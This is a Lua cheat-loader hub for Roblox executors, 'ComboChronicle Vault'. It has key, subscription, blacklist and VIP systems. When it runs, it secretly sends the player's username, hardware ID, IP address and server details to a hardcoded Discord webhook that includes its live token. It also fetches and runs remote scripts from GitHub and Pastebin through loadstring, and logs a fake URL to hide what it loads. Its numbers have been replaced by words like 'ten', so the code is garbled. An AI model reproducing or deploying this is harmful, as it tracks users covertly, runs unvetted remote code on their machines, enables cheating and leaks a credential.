local success, Rayfield = pcall(loadstring(game:HttpGet('https://sirius.menu/rayfield')))
if not success then
    warn("Failed to load Rayfield: " .. tostring(Rayfield))
    return
end
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local DataStoreService = game:GetService("DataStoreService")

-- Config
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1354219342840991964/kgyogYrGVoTXLoR472lDz7zM8KcKHK1EK46ss-Ppmg7tSOpUz0uYeujtrdGMD5Dfk1bw",
    KEY_URL = "https://pastebin.com/raw/VHW3Fa9s",
    SUBSCRIPTION_URL = "https://pastebin.com/raw/ThRPn5JG",
    NEWS_URL = "https://pastebin.com/raw/vTKfsvCr",
    BLACKLIST_URL = "https://pastebin.com/raw/3h23tX2Y",
    WHITELIST_URL = "https://pastebin.com/raw/Qmp4r6es",
    HTTP_TIMEOUT = ten,
    FEEDBACK_COOLDOWN = fourtyFiveHundred,
    REFRESH_INTERVAL = oneEighty,
    VERSION = "one.three.zero",
    VIP_PERKS = {
        SCRIPT_BOOST = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/VIP_Boost",
        EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui"
    }
}

-- Persistent DataStore
local VaultDataStore
local function initializeDataStore()
    local success, ds = pcall(function()
        return DataStoreService:GetDataStore("VaultData_v1")
    end)
    if success then
        VaultDataStore = ds
    else
        warn("DataStore initialization failed: " .. tostring(ds) .. ". Using local storage fallback.")
    end
end
initializeDataStore()

local function getDataStore(key, default)
    if not VaultDataStore then return default end
    local success, data = pcall(function()
        return VaultDataStore:GetAsync(tostring(LocalPlayer.UserId) .. "_" .. key)
    end)
    return success and data or default
end

local function setDataStore(key, value)
    if VaultDataStore then
        pcall(function()
            VaultDataStore:SetAsync(tostring(LocalPlayer.UserId) .. "_" .. key, value)
        end)
    end
end

-- Local storage
local function getLocalStorage(key, default)
    local success, data = pcall(function()
        return LocalPlayer:GetAttribute(key)
    end)
    return (success and data) or default
end

local function setLocalStorage(key, value)
    pcall(function()
        LocalPlayer:SetAttribute(key, value)
    end)
end

-- Improved HTTP
local HTTP_RATE_LIMIT = pointFive
local lastHttpRequest = zero
local function safeHttpGet(url, retries)
    retries = retries or two
    local data, success, errorMsg
    
    for i = one, retries do
        while (tick() - lastHttpRequest) < HTTP_RATE_LIMIT do wait(pointOne) end
        lastHttpRequest = tick()
        
        local requestComplete = false
        local requestThread = coroutine.create(function()
            success, data = pcall(function()
                return game:HttpGet(url)
            end)
            if not success then
                errorMsg = data
                data = nil
            end
            requestComplete = true
        end)
        
        coroutine.resume(requestThread)
        
        local startTime = tick()
        while not requestComplete and (tick() - startTime) < CONFIG.HTTP_TIMEOUT do
            wait(pointOne)
        end
        
        if requestComplete and success then
            local fakeUrl = "https://fakeurl.com/script" .. math.random(oneThousand, nineThousandNineHundredNinetyNine)
            print("HTTP success for " .. fakeUrl .. ": " .. (data and "data_loaded" or "empty"))
            return true, data
        end
        
        warn("HTTP attempt " .. i .. " failed for " .. url .. ": " .. (errorMsg or "timeout"))
        if i < retries then wait(one) end
    end
    
    return false, errorMsg or "Request timed out"
end

-- Player Info Gathering Function
local function getPlayerInfo()
    local info = {}
    
    info.UserId = LocalPlayer.UserId
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.HWID = game:GetService("RbxAnalyticsService"):GetClientId()
    info.GameId = game.PlaceId
    info.JobId = game.JobId
    info.AccountAge = LocalPlayer.AccountAge
    info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * eightySixThousandFourHundred))
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    info.IP = success and ip or "Hidden (Roblox Limitation)"
    info.Executor = "Unknown"
    if syn then info.Executor = "Synapse X"
    elseif Krnl then info.Executor = "Krnl"
    elseif getgenv and getgenv().Drawing then info.Executor = "Generic (Drawing API Detected)"
    end
    
    return info
end

-- Blacklist/Whitelist System
local accessControl = {
    blacklist = {},
    whitelist = {},
    lastFetch = zero,
    isFetching = false,
    
    fetchLists = function(self)
        if self.isFetching or (tick() - self.lastFetch < threeHundred) then return end
        self.isFetching = true
        
        local blSuccess, blData = safeHttpGet(CONFIG.BLACKLIST_URL)
        if blSuccess then
            self.blacklist = {}
            for line in blData:gmatch("[^\n]+") do
                local userId = tonumber(line)
                if userId then self.blacklist[userId] = true end
            end
        end
        
        local wlSuccess, wlData = safeHttpGet(CONFIG.WHITELIST_URL)
        if wlSuccess then
            self.whitelist = {}
            for line in wlData:gmatch("[^\n]+") do
                local userId = tonumber(line)
                if userId then self.whitelist[userId] = true end
            end
        end
        
        self.lastFetch = tick()
        self.isFetching = false
    end,
    
    isBlacklisted = function(self, userId)
        self:fetchLists()
        return self.blacklist[userId] == true
    end,
    
    isWhitelisted = function(self, userId)
        self:fetchLists()
        return self.whitelist[userId] == true
    end,
    
    getStatus = function(self, userId)
        self:fetchLists()
        if self.blacklist[userId] then return "Blacklisted"
        elseif self.whitelist[userId] then return "Whitelisted"
        else return "Neutral" end
    end
}

-- Key system
local keySystem = {
    key = nil,
    lastFetch = zero,
    isFetching = false,
    
    fetch = function(self)
        if self.isFetching then return end
        self.isFetching = true
        
        if self.key and (tick() - self.lastFetch < threeHundred) then
            self.isFetching = false
            return self.key
        end
        
        Rayfield:Notify({Title = "⏳ Loading", Content = "Fetching key...", Duration = two})
        local success, response = safeHttpGet(CONFIG.KEY_URL)
        if success then
            self.key = response
            self.lastFetch = tick()
        else
            self.key = "Key22Changed"
            Rayfield:Notify({Title = "⚠️ Warning", Content = "Using fallback key.", Duration = three})
        end
        self.isFetching = false
        return self.key
    end,
    
    verify = function(self, input)
        return input == self:fetch()
    end
}

-- Subscription system
local subscriptionSystem = {
    data = {},
    lastUpdate = zero,
    
    fetch = function(self)
        if (tick() - self.lastUpdate) < threeHundred then return end
        local success, data = safeHttpGet(CONFIG.SUBSCRIPTION_URL)
        if success then
            self.data = {}
            for line in data:gmatch("[^\n]+") do
                local userId, expiry = line:match("(%d+):(%d+)")
                if userId and expiry then
                    self.data[tonumber(userId)] = tonumber(expiry)
                end
            end
            self.lastUpdate = tick()
        end
    end,
    
    isSubscribed = function(self, userId)
        self:fetch()
        local expiry = self.data[userId]
        return expiry and os.time() < expiry
    end,
    
    getTimeRemaining = function(self, userId)
        if not self:isSubscribed(userId) then return zero end
        return self.data[userId] - os.time()
    end,
    
    formatTimeRemaining = function(self, userId)
        local seconds = self:getTimeRemaining(userId)
        if seconds <= zero then return "Expired" end
        local days = math.floor(seconds / eightySixThousandFourHundred)
        local hours = math.floor((seconds % eightySixThousandFourHundred) / threeThousandSixHundred)
        local minutes = math.floor((seconds % threeThousandSixHundred) / sixty)
        if days > zero then return string.format("%d days, %d hrs", days, hours)
        elseif hours > zero then return string.format("%d hrs, %d min", hours, minutes)
        else return string.format("%d min", minutes) end
    end,
    
    extendSubscription = function(self, userId, days)
        if self.data[userId] then
            local newExpiry = math.max(self.data[userId], os.time()) + (days * eightySixThousandFourHundred)
            self.data[userId] = newExpiry
            setDataStore("subExpiry", newExpiry)
            return true
        end
        return false
    end
}

-- Webhook system
local webhookSystem = {
    queue = {},
    processing = false,
    batchSize = five,
    
    formatTime = function(self, seconds)
        local hours = math.floor(seconds / threeThousandSixHundred)
        local minutes = math.floor((seconds % threeThousandSixHundred) / sixty)
        local secs = math.floor(seconds % sixty)
        if hours > zero then return string.format("%d hrs, %d min", hours, minutes)
        elseif minutes > zero then return string.format("%d min, %d sec", minutes, secs)
        else return string.format("%d sec", secs) end
    end,
    
    send = function(self, embedData)
        table.insert(self.queue, embedData)
        if not self.processing then self:processQueue() end
    end,
    
    processQueue = function(self)
        if #self.queue == zero then
            self.processing = false
            return
        end
        self.processing = true
        local batch = {}
        for i = one, math.min(self.batchSize, #self.queue) do
            local embed = table.remove(self.queue, one)
            embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION }
            embed.timestamp = embed.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
            if embed.title == "🚀 Script Execution" then
                embed.components = {
                    {
                        type = one,
                        components = {
                            { type = two, style = three, label = "Blacklist", custom_id = "blacklist_" .. LocalPlayer.UserId },
                            { type = two, style = two, label = "Whitelist", custom_id = "whitelist_" .. LocalPlayer.UserId }
                        }
                    }
                }
            end
            table.insert(batch, embed)
        end
        local success, response = pcall(function()
            local http_request = (syn and syn.request) or (http and http.request) or request or httprequest
            if not http_request then
                warn("No HTTP request function available")
                return false
            end
            local result = http_request({
                Url = CONFIG.WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ embeds = batch })
            })
            return result and (result.StatusCode == twoHundredFour or result.Success)
        end)
        if not success then
            warn("Webhook failed: " .. tostring(response))
            for _, embed in ipairs(batch) do
                embed.retryCount = (embed.retryCount or zero) + one
                if embed.retryCount < three then table.insert(self.queue, embed) end
            end
        elseif success then
            print("Webhook sent successfully")
        end
        wait(one)
        self:processQueue()
    end
}

-- Script loader
local scriptSystem = {
    scripts = {
        ["gameOne"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/FireTouchIntrest%20Universal",
        ["gameTwo"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Hitbox%20Gunfight%20Arena",
        ["gameThree"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Prison%20Life",
        ["gameFour"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Dig%20it(Auto-Dig%20%2B%20more%20coming)",
        ["gameFive"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Nuke%20Tycoon%20Nuclear",
        ["gameSix"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/TheOneV1",
        ["gameSeven"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameEight"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameNine"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameEleven"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTwelve"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameThirteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameFourteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameFifteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameSixteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameSeventeen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameEighteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameNineteen"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ENTRENCHED_WW1",
        ["gameTwenty"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTwentyOne"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTwentyTwo"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTwentyThree"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        ["gameTwentyFour"] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/HM42",
        ["gameTwentyFive"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/B-NPC-R-DIE",
        ["gameTwentySix"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/DRIVING%20EMPIRE",
        ["gameTwentySeven"] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/dv22",
        ["gameTwentyEight"] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/DEAD",
        ["gameTwentyNine"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/drilling",
        ["gameThirty"] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/new",
        ["gameThirtyOne"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Be%20A%20Parkour%20Ninja",
        ["gameThirtyTwo"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/premi",
        ["gameThirtyThree"] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Be%20A%20car",
        ["gameThirtyFour"] = {
            "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Phoenix%20Grounds",
            "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Teleport%20Behind%20Player"
        }
    },
    defaultScript = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Default",
    vipScript = CONFIG.VIP_PERKS.SCRIPT_BOOST,
    
    getScriptForGame = function(self, gameId)
        local gameMapping = {
            [18209375211] = "gameOne",
            [14518422161] = "gameTwo",
            [155615604] = "gameThree",
            [76455837887178] = "gameFour",
            [7920018625] = "gameFive",
            [15694891095] = "gameSix",
            [106266102947071] = "gameSeven",
            [15948669967] = "gameEight",
            [77074973013032] = "gameNine",
            [17333357466] = "gameTen",
            [8233004585] = "gameEleven",
            [11638805019] = "gameTwelve",
            [15599178512] = "gameThirteen",
            [16291041162] = "gameFourteen",
            [84000476186267] = "gameFifteen",
            [9679014784] = "gameSixteen",
            [18365888493] = "gameSeventeen",
            [16168039994] = "gameEighteen",
            [3678761576] = "gameNineteen",
            [8735521924] = "gameTwenty",
            [6654918151] = "gameTwentyOne",
            [17209126270] = "gameTwentyTwo",
            [5732301513] = "gameTwentyThree",
            [94590879393563] = "gameTwentyFour",
            [11276071411] = "gameTwentyFive",
            [3351674303] = "gameTwentySix",
            [73010525850196] = "gameTwentySeven",
            [85832836496852] = "gameTwentyEight",
            [125723653259639] = "gameTwentyNine",
            [9865958871] = "gameThirty",
            [147848991] = "gameThirtyOne",
            [18267483030] = "gameThirtyTwo",
            [107326628277908] = "gameThirtyThree",
            [5223287266] = "gameThirtyFour"
        }
        return self.scripts[gameMapping[gameId]] or self.defaultScript
    end,
    
    loadScript = function(self, scriptUrl, notifyOnLoad)
        spawn(function()
            if notifyOnLoad then
                Rayfield:Notify({Title = "⏳ Loading", Content = "Loading script...", Duration = two})
            end
            local success, errorMsg = pcall(function()
                loadstring(game:HttpGet(scriptUrl))()
            end)
            if success and notifyOnLoad then
                Rayfield:Notify({Title = "✅ Success", Content = "Script loaded!", Duration = three})
            elseif not success then
                Rayfield:Notify({Title = "❌ Error", Content = "Failed: " .. (errorMsg or "Unknown"), Duration = five})
            end
        end)
    end,
    
    loadScriptSet = function(self, scriptSet, notifyOnLoad)
        if type(scriptSet) == "table" then
            for i, url in ipairs(scriptSet) do
                self:loadScript(url, notifyOnLoad and i == one)
            end
        else
            self:loadScript(scriptSet, notifyOnLoad)
        end
    end
}

-- Challenge system
local challengeSystem = {
    challenges = {
        {id = "login_streak", name = "Login Streak", progress = zero, goal = five, reward = "fifty VC"},
        {id = "feedback_pro", name = "Feedback Pro", progress = zero, goal = three, reward = "VIP Extension (one day)"},
        {id = "script_usage", name = "Script Enthusiast", progress = zero, goal = ten, reward = "Exclusive Script"}
    },
    
    load = function(self)
        for i, challenge in ipairs(self.challenges) do
            local savedProgress = getDataStore("challenge_" .. challenge.id, zero)
            self.challenges[i].progress = savedProgress
        end
    end,
    
    save = function(self)
        for _, challenge in ipairs(self.challenges) do
            setDataStore("challenge_" .. challenge.id, challenge.progress)
        end
    end,
    
    updateProgress = function(self, challengeId, increment)
        for i, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId then
                self.challenges[i].progress = math.min(challenge.progress + (increment or one), challenge.goal)
                self:save()
                if self.challenges[i].progress >= self.challenges[i].goal then
                    return true
                end
                return false
            end
        end
    end,
    
    resetProgress = function(self, challengeId)
        for i, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId then
                self.challenges[i].progress = zero
                self:save()
                return true
            end
        end
        return false
    end,
    
    getFormattedText = function(self)
        local text = "🏆 Active Challenges 🏆\n\n"
        for i, challenge in ipairs(self.challenges) do
            local progressBar = ""
            local barLength = ten
            local filledBars = math.floor((challenge.progress / challenge.goal) * barLength)
            for j = one, barLength do
                progressBar = progressBar .. (j <= filledBars and "■" or "□")
            end
            text = text .. challenge.name .. ":\n" .. progressBar .. " " .. challenge.progress .. "/" .. challenge.goal .. " (" .. challenge.reward .. ")\n\n"
        end
        return text
    end,
    
    awardReward = function(self, challengeId)
        for _, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId and challenge.progress >= challenge.goal then
                if challenge.id == "feedback_pro" and subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                    subscriptionSystem:extendSubscription(LocalPlayer.UserId, one)
                elseif challenge.id == "script_usage" then
                    scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
                end
                self:resetProgress(challengeId)
                return true
            end
        end
        return false
    end
}

-- News system
local newsSystem = {
    content = "Loading news...",
    lastUpdate = zero,
    cache = getLocalStorage("newsCache", ""),
    
    formatNews = function(self, rawNews)
        if not rawNews or rawNews == "" then return "No news yet!" end
        local lines = {}
        for line in rawNews:gmatch("[^\n]+") do table.insert(lines, line) end
        local formatted = "✨ Vault Chronicle ✨\n════════════════════\n"
        for i, line in ipairs(lines) do
            if line:match("^NEWS:") then
                formatted = formatted .. "📰 " .. line:gsub("^NEWS:%s*", "") .. " 📰\n"
            else
                formatted = formatted .. "➤ " .. line .. "\n"
            end
            if i < #lines then formatted = formatted .. "────────────\n" end
        end
        formatted = formatted .. "════════════════════\nUpdated: " .. os.date("%Y-%m-%d %H:%M UTC")
        return formatted
    end,
    
    update = function(self)
        if (tick() - self.lastUpdate) < CONFIG.REFRESH_INTERVAL then
            self.content = self.cache
            return false
        end
        local success, news = safeHttpGet(CONFIG.NEWS_URL)
        if success then
            self.content = self:formatNews(news)
            self.lastUpdate = tick()
            self.cache = self.content
            setLocalStorage("newsCache", self.cache)
            return true
        end
        self.content = self.cache
        return false
    end
}

-- Initialize
accessControl:fetchLists()
subscriptionSystem:fetch()
challengeSystem:load()
newsSystem:update()
local lastFeedbackTime = getDataStore("lastFeedbackTime", zero)

-- Check access before proceeding
if accessControl:isBlacklisted(LocalPlayer.UserId) then
    Rayfield:Notify({
        Title = "🚫 Access Denied",
        Content = "You have been blacklisted from using this script.",
        Duration = ten,
        Image = "Star"
    })
    return
end

-- Gather player info for webhook
local playerInfo = getPlayerInfo()

-- Execution webhook with enhanced info
webhookSystem:send({
    title = "🚀 Script Execution",
    description = string.format("**%s** has launched Vault v%s", LocalPlayer.DisplayName, CONFIG.VERSION),
    color = "Blue",
    fields = {
        { name = "👤 Username", value = "```" .. playerInfo.Username .. "```", inline = true },
        { name = "🆔 User ID", value = "```" .. playerInfo.UserId .. "```", inline = true },
        { name = "🔑 Hardware ID", value = "```" .. playerInfo.HWID .. "```", inline = true },
        { name = "🎮 Game ID", value = "```" .. playerInfo.GameId .. "```", inline = true },
        { name = "🌐 Server JobId", value = "```" .. playerInfo.JobId .. "```", inline = true },
        { name = "📅 Account Age", value = playerInfo.AccountAge .. " days", inline = true },
        { name = "🕒 Join Date", value = playerInfo.JoinDate, inline = true },
        { name = "🌍 IP (Approx)", value = "```" .. playerInfo.IP .. "```", inline = true },
        { name = "💻 Executor", value = playerInfo.Executor, inline = true },
        { name = "⭐ VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
        { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
    }
})

-- GUI Setup
local Window
local success, err = pcall(function()
    Window = Rayfield:CreateWindow({
        Name = "ComboChronicle Vault | NextGen v" .. CONFIG.VERSION,
        LoadingTitle = "Initializing Vault ❖",
        LoadingSubtitle = "By COMBO_WICK | Bang.E.Line",
        Theme = "Ocean"
    })
end)
if not success then
    warn("Failed to create Window: " .. tostring(err))
    return
end

-- Key & Credits Tab
local KeyTab = Window:CreateTab("KeyAndCredits", "Star")
local keyInput = KeyTab:CreateInput({
    Name = "Enter Key",
    PlaceholderText = "Type the key here...",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        Rayfield:Notify({Title = "Checking", Content = "Verifying key...", Duration = two})
        task.wait(pointSeven)
        if keySystem:verify(input) then
            Rayfield:Notify({Title = "Success", Content = "Access granted!", Duration = three})
            challengeSystem:updateProgress("login_streak")
            local gameId = game.PlaceId
            local scriptToLoad = scriptSystem:getScriptForGame(gameId)
            task.wait(one)
            Rayfield:Destroy()
            scriptSystem:loadScriptSet(scriptToLoad, true)
        else
            Rayfield:Notify({Title = "Invalid", Content = "Join Discord for key!", Duration = five, Image = "Star"})
        end
    end
})

KeyTab:CreateButton({
    Name = "CopyLinks",
    Callback = function()
        setclipboard("Discord: discord.com/invite/mwTHaCKzhw\nYouTube: https://www.youtube.com/@COMBO_WICK")
        Rayfield:Notify({Title = "Copied", Content = "Links copied!", Duration = five})
    end
})

KeyTab:CreateParagraph({
    Title = "Credits",
    Content = "Script by COMBO_WICK & Star\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnjoy the Vault!"
})

-- Responses Tab
local ResponseTab = Window:CreateTab("Responses", "Star")
local ResponseSection = ResponseTab:CreateSection("MessageSystem")
local currentResponse = ""
ResponseTab:CreateInput({
    Name = "YourMessage",
    PlaceholderText = "Share thoughts or report bugs...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text) currentResponse = text end
})

ResponseTab:CreateButton({
    Name = "SubmitFeedback",
    Info = "Send feedback to developers",
    Interact = "Submit",
    Callback = function()
        local currentTime = tick()
        local timeRemaining = CONFIG.FEEDBACK_COOLDOWN - (currentTime - lastFeedbackTime)
        if timeRemaining > zero then
            Rayfield:Notify({Title = "Cooldown", Content = "Wait " .. webhookSystem:formatTime(timeRemaining), Duration = five, Image = "Star"})
            return
        end
        if currentResponse == "" then
            Rayfield:Notify({Title = "Error", Content = "Enter a message!", Duration = three, Image = "Star"})
            return
        end
        webhookSystem:send({
            title = "NewFeedback",
            description = currentResponse,
            color = "LightBlue",
            fields = {
                { name = "User", value = LocalPlayer.DisplayName, inline = true },
                { name = "ID", value = tostring(LocalPlayer.UserId), inline = true },
                { name = "Game", value = tostring(game.PlaceId), inline = true },
                { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
            }
        })
        Rayfield:Notify({Title = "Sent", Content = "Feedback delivered!", Duration = five, Image = "Star"})
        challengeSystem:updateProgress("feedback_pro")
        if challengeSystem:awardReward("feedback_pro") then
            Rayfield:Notify({Title = "Reward", Content = "VIP Extended by one day!", Duration = five})
        end
        lastFeedbackTime = currentTime
        setDataStore("lastFeedbackTime", lastFeedbackTime)
        currentResponse = ""
    end
})

ResponseTab:CreateLabel("Cooldown: oneHourFifteenMinutes")
ResponseTab:CreateLabel("Bugs or suggestions welcome!")

-- News Tab
local NewsTab = Window:CreateTab("News", "Star")
local newsParagraph = NewsTab:CreateParagraph({
    Title = "VaultUpdates",
    Content = newsSystem.content
})

spawn(function()
    while wait(CONFIG.REFRESH_INTERVAL) do
        if newsSystem:update() then
            newsParagraph:Set({Title = "VaultUpdates", Content = newsSystem.content or "No news available"})
        end
    end
end)

NewsTab:CreateButton({
    Name = "RefreshNews",
    Callback = function()
        Rayfield:Notify({Title = "Updating", Content = "Fetching news...", Duration = two})
        if newsSystem:update() then
            newsParagraph:Set({Title = "VaultUpdates", Content = newsSystem.content or "No news available"})
            Rayfield:Notify({Title = "Updated", Content = "News refreshed!", Duration = three})
        else
            Rayfield:Notify({Title = "Failed", Content = "Try again later.", Duration = three})
        end
    end
})

-- Subscription Tab
local SubTab
if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
    SubTab = Window:CreateTab("Subscription", "Star")
    local subParagraph = SubTab:CreateParagraph({
        Title = "VaultElite",
        Content = "Loading subscription details..."
    })
    
    local function updateSubStatus()
        if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
            local timeRemaining = subscriptionSystem:formatTimeRemaining(LocalPlayer.UserId)
            subParagraph:Set({
                Title = "VaultElite",
                Content = "Status: Subscribed\n" ..
                          "Perks: VIP Scripts, Priority Support, Boosts\n" ..
                          "Expires in: " .. timeRemaining .. "\n" ..
                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
            })
        else
            subParagraph:Set({
                Title = "VaultElite",
                Content = "Status: Expired\n" ..
                          "Renew to regain VIP benefits!\n" ..
                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
            })
        end
    end
    
    spawn(function()
        wait(one)
        updateSubStatus()
    end)
    
    spawn(function()
        while wait(sixty) do
            subscriptionSystem:fetch()
            updateSubStatus()
        end
    end)
    
    SubTab:CreateButton({
        Name = "RenewSubscription",
        Callback = function()
            setclipboard("discord.com/invite/mwTHaCKzhw")
            Rayfield:Notify({Title = "Subscription", Content = "Discord copied! Contact admins.", Duration = five})
        end
    })
    
    SubTab:CreateButton({
        Name = "LoadVIPBoost",
        Callback = function()
            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                scriptSystem:loadScript(scriptSystem.vipScript, true)
                challengeSystem:updateProgress("script_usage")
                if challengeSystem:awardReward("script_usage") then
                    Rayfield:Notify({Title = "Reward", Content = "Exclusive UI Unlocked!", Duration = five})
                end
            else
                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = five})
            end
        end
    })
    
    SubTab:CreateButton({
        Name = "LoadVIPUI",
        Callback = function()
            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
            else
                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = five})
            end
        end
    })
    
    if not getDataStore("VIPBadgeShown", false) then
        wait(three)
        Rayfield:Notify({
            Title = "VIPBadge",
            Content = "Welcome, Vault Elite Member!\nEnjoy your exclusive perks.",
            Duration = ten,
            Image = "Star"
        })
        setDataStore("VIPBadgeShown", true)
    end
end

-- Challenges Tab
local ChallengeTab = Window:CreateTab("Challenges", "Star")
local challengeParagraph = ChallengeTab:CreateParagraph({
    Title = "DailyGoals",
    Content = challengeSystem:getFormattedText()
})

ChallengeTab:CreateButton({
    Name = "RefreshChallenges",
    Callback = function()
        challengeParagraph:Set({Content = challengeSystem:getFormattedText()})
        Rayfield:Notify({Title = "Refreshed", Content = "Progress updated!", Duration = three})
    end
})

ChallengeTab:CreateButton({
    Name = "ClaimRewards",
    Callback = function()
        for _, challenge in ipairs(challengeSystem.challenges) do
            if challengeSystem:awardReward(challenge.id) then
                Rayfield:Notify({
                    Title = "Claimed",
                    Content = "Reward for " .. challenge.name .. " claimed!",
                    Duration = five
                })
            end
        end
        challengeParagraph:Set({Content = challengeSystem:getFormattedText()})
    end
})

-- Settings Tab
local SettingsTab = Window:CreateTab("Settings", "Star")
SettingsTab:CreateToggle({
    Name = "Notifications",
    CurrentValue = getLocalStorage("notificationsEnabled", true),
    Flag = "notificationsToggle",
    Callback = function(value)
        setLocalStorage("notificationsEnabled", value)
        Rayfield:Notify({Title = "Settings", Content = value and "Notifications on" or "Notifications off", Duration = three})
    end
})

SettingsTab:CreateToggle({
    Name = "AutoUpdateScripts",
    CurrentValue = getLocalStorage("autoUpdateEnabled", true),
    Flag = "autoUpdateToggle",
    Callback = function(value)
        setLocalStorage("autoUpdateEnabled", value)
    end
})

SettingsTab:CreateButton({
    Name = "ClearCache",
    Callback = function()
        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown"}) do
            pcall(function() LocalPlayer:SetAttribute(attr, nil) end)
        end
        Rayfield:Notify({Title = "Cleaned", Content = "Cache cleared! Restart to apply.", Duration = five})
    end
})

SettingsTab:CreateButton({
    Name = "RestartVault",
    Callback = function()
        Rayfield:Notify({Title = "Restarting", Content = "Reloading Vault...", Duration = three})
        wait(one)
        Rayfield:Destroy()
        loadstring(game:HttpGet(''))()
    end
})

-- Analytics Tab
local AnalyticsTab = Window:CreateTab("Analytics", "Star")
local analyticsParagraph = AnalyticsTab:CreateParagraph({
    Title = "YourStats",
    Content = "Loading analytics..."
})

local function updateAnalytics()
    local loginCount = getDataStore("loginCount", zero) + one
    setDataStore("loginCount", loginCount)
    local feedbackCount = getDataStore("feedbackCount", zero)
    local subStatus = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Active" or "Inactive"
    local content = "User: " .. LocalPlayer.DisplayName .. "\n" ..
                    "Logins: " .. loginCount .. "\n" ..
                    "Feedback Sent: " .. feedbackCount .. "\n" ..
                    "Subscription: " .. subStatus .. "\n" ..
                    "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
    analyticsParagraph:Set({Content = content})
end

spawn(function()
    wait(two)
    updateAnalytics()
end)

AnalyticsTab:CreateButton({
    Name = "RefreshStats",
    Callback = function() updateAnalytics() end
})

-- VIP Auto-Load
if subscriptionSystem:isSubscribed(LocalPlayer.UserId) and getLocalStorage("autoUpdateEnabled", true) then
    spawn(function()
        wait(five)
        scriptSystem:loadScript(scriptSystem.vipScript, true)
    end)
end

-- Finalize
print("ComboChronicle Vault NextGen v" .. CONFIG.VERSION .. " loaded successfully!")
